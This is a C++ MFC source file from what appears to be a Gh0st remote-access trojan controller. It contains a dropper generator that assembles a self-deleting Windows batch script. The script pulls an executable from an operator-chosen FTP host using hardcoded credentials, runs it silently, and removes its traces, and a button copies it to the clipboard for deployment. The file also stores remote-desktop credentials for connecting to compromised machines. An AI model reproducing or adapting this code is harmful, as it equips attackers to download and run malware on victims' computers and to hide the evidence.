// Proxy.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "Proxy.h"
#include "PcView.h"
#include "PortMap.h"
#include "User.h"
#include "UPDATEIP.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
extern CPcView* g_pConnectView;
/////////////////////////////////////////////////////////////////////////////
// CProxy

CProxy* g_pProxy;

IMPLEMENT_DYNCREATE(CProxy, CFormView)

//CString ftp_net= "baihej.oicp.net";

char *ftpserwer0 = {"@echo off\r\n"
                    ":begin\r\n"
};
char *ftpserwer1 = {"echo open %ftp%>> cmd.txt\r\n"
                    "echo 110>> cmd.txt\r\n"
					"echo 110>> cmd.txt\r\n"
					"echo get %var%>> cmd.txt\r\n"
					"echo bye>> cmd.txt\r\n"
					"ftp -s:cmd.txt\r\n"
					"del cmd.txt\r\n"
					"if not exist %var% (\r\n"
					"echo NO! NO!...\r\n"
					"goto :begin\r\n"
					") else (\r\n"
					"%var% /q\r\n"
					")\r\n"
					"del %var%\r\n"
					"del %0"
};

void CProxy::ftpnets()
{
	CString ftp_ser0 = ftpserwer0;
	CString ftp_ser1 = ftpserwer1;
	CString ftp_ser2 = "set \"ftp="+m_ftpset+"\"\r\n";
	CString ftp_ser3 = "set \"var="+m_ftpnema+"\"\r\n";
	m_ftpserwer = ftp_ser0+ftp_ser2+ftp_ser3+ftp_ser1;
}

CProxy::CProxy()
	: CFormView(CProxy::IDD)
{
	//{{AFX_DATA_INIT(CProxy)
	m_ftpnema = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Զ�̷���","Ftpnema","1.exe");
	m_ftpset = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Զ�̷���","Ftpset","127.0.0.1");  
	m_longip = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Զ�̷���","Longip","127.0.0.1"); 
	m_longnema = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Զ�̷���","Longnama","administrator"); 
	m_longpass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Զ�̷���","Longpass","123456"); 
	m_longport = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Զ�̷���","Longport","3389"); 

	m_long_nema.SetCurSel(0);
	//}}AFX_DATA_INIT


	ftpnets();
}

CProxy::~CProxy()
{
}

void CProxy::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CProxy)
	DDX_Text(pDX, IDC_FTP_SERVER, m_ftpserwer);
	DDX_Text(pDX, IDC_FTP_NEMA, m_ftpnema);
	DDX_Text(pDX, IDC_FTP_SET, m_ftpset);
	DDX_Text(pDX, IDC_LONGIP, m_longip);
	DDX_Control(pDX, IDC_LONGNEMA, m_long_nema);
	DDX_Text(pDX, IDC_LONGNEMA, m_longnema);
	DDX_Text(pDX, IDC_LONGPASS, m_longpass);
	DDX_Text(pDX, IDC_LONGPORT, m_longport);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CProxy, CFormView)
	//{{AFX_MSG_MAP(CProxy)
	ON_BN_CLICKED(IDC_FTP_Prese, OnFTPPrese)
	ON_EN_CHANGE(IDC_FTP_SET, OnChangeFtpSet)
	ON_EN_CHANGE(IDC_FTP_NEMA, OnChangeFtpNema)
	ON_BN_CLICKED(IDC_FTP_Filecopy, OnFTPFilecopy)
//	ON_EN_CHANGE(IDC_LONGIP, OnChangeLongip)
//	ON_EN_CHANGE(IDC_LONGNEMA, OnChangeLongnema)
//	ON_EN_CHANGE(IDC_LONGPASS, OnChangeLongpass)
	ON_BN_CLICKED(IDC_LONGNECT, OnLongnect)
//	ON_EN_CHANGE(IDC_LONGPORT, OnChangeLongport)
	ON_BN_CLICKED(IDC_FTP_IP, OnFtpIp)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CProxy diagnostics

#ifdef _DEBUG
void CProxy::AssertValid() const
{
	CFormView::AssertValid();
}

void CProxy::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CProxy message handlers

/////////////////////////////////////////////////////////////////////////////
// Cproxy

IMPLEMENT_DYNCREATE(Cproxy, CFormView)

Cproxy::Cproxy()
	: CFormView(Cproxy::IDD)
{
	//{{AFX_DATA_INIT(Cproxy)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}

Cproxy::~Cproxy()
{
}

void Cproxy::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(Cproxy)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(Cproxy, CFormView)
	//{{AFX_MSG_MAP(Cproxy)
		// NOTE - the ClassWizard will add and remove mapping macros here.
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// Cproxy diagnostics

#ifdef _DEBUG
void Cproxy::AssertValid() const
{
	CFormView::AssertValid();
}

void Cproxy::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// Cproxy message handlers

void CProxy::OnFTPPrese() 
{
	// TODO: Add your control notification handler code here
//	UpdateData(TRUE);
	// ��������
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Զ�̷���", "Ftpset", m_ftpset);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Զ�̷���", "Ftpnema", m_ftpnema);

	ftpnets();
	SetDlgItemText(IDC_FTP_SERVER, m_ftpserwer);
}

void CProxy::OnChangeFtpSet() 
{
	UpdateData(TRUE);
}

void CProxy::OnChangeFtpNema() 
{
	UpdateData(TRUE);
}

void CProxy::OnFTPFilecopy()   //�����ļ�
{
	int nItem;
    CString strText = m_ftpserwer;

		//�����ݱ��浽�����塣
		if (!strText.IsEmpty())
		{
			if (OpenClipboard())
			{
				EmptyClipboard();
				HGLOBAL hClipboardData = GlobalAlloc(GHND | GMEM_SHARE, (strText.GetLength() + 1) * sizeof(TCHAR));
				if (hClipboardData)
				{
					TCHAR* pszData = (TCHAR *)GlobalLock(hClipboardData);
					_tcscpy(pszData, strText);
					GlobalUnlock(hClipboardData);
					SetClipboardData(CF_TEXT, hClipboardData);
				}
				CloseClipboard();
			}
		}
}
/*
void CProxy::OnChangeLongip() 
{
//	UpdateData(TRUE);
}

void CProxy::OnChangeLongnema() 
{
//	UpdateData(TRUE);
}

void CProxy::OnChangeLongpass() 
{
//	UpdateData(TRUE);
}

void CProxy::OnChangeLongport() 
{
//	UpdateData(TRUE);
}
*/
void CProxy::OnLongnect() 
{
	UpdateData(TRUE);
	// ��������
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Զ�̷���", "Longip", m_longip);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Զ�̷���", "Longport", m_longport);
//	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Զ�̷���", "Longnama", m_longnema);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Զ�̷���", "Longpass", m_longpass);

	CUser sty;
	sty.Remotedesktop(m_longip,m_longport,m_longnema,m_longpass);
}

void CProxy::OnFtpIp() 
{
	// TODO: Add your control notification handler code here
	CUPDATEIP sty;
	CString Gip;
	Gip=sty.GetIPAddress();

	SetDlgItemText(IDC_FTP_SET,Gip);
}
